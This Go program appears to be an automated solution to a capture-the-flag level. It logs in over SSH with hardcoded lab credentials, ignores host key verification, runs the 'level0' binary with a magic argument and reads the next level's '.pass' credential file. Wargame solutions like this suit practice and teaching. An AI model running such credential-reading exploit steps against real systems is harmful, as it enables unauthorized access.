package main

import (
	"fmt"
	"io"
	"os"
	"time"

	"golang.org/x/crypto/ssh"
)

func main() {
	host := "10.171.52.176"
	port := "4242"
	user := "level0"
	password := "level0"

	clientConfig := &ssh.ClientConfig{
		User: user,
		Auth: []ssh.AuthMethod{
			ssh.Password(password),
		},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout:         5 * time.Second,
	}

	client, err := ssh.Dial("tcp", fmt.Sprintf("%s:%s", host, port), clientConfig)
	if err != nil {
		panic(err)
	}
	defer client.Close()

	session, err := client.NewSession()
	if err != nil {
		panic(err)
	}
	defer session.Close()

	if err := session.RequestPty("xterm", 40, 120, ssh.TerminalModes{}); err != nil {
		panic(err)
	}

	stdin, err := session.StdinPipe()
	if err != nil {
		panic(err)
	}
	stdout, err := session.StdoutPipe()
	if err != nil {
		panic(err)
	}
	stderr, err := session.StderrPipe()
	if err != nil {
		panic(err)
	}

	if err := session.Shell(); err != nil {
		panic(err)
	}

	go func() {
		_, _ = io.Copy(os.Stdout, stdout)
	}()
	go func() {
		_, _ = io.Copy(os.Stderr, stderr)
	}()

	commands := []string{
		"./level0 423",
		"cat /home/user/level1/.pass",
		"exit",
		"exit",
	}

	for _, cmd := range commands {
		if _, err := fmt.Fprintf(stdin, "%s\n", cmd); err != nil {
			panic(err)
		}
		time.Sleep(500 * time.Millisecond)
	}

	if err := session.Wait(); err != nil {
		if exitErr, ok := err.(*ssh.ExitError); ok {
			fmt.Fprintf(os.Stderr, "remote shell exited: %v\n", exitErr)
		} else {
			panic(err)
		}
	}
}
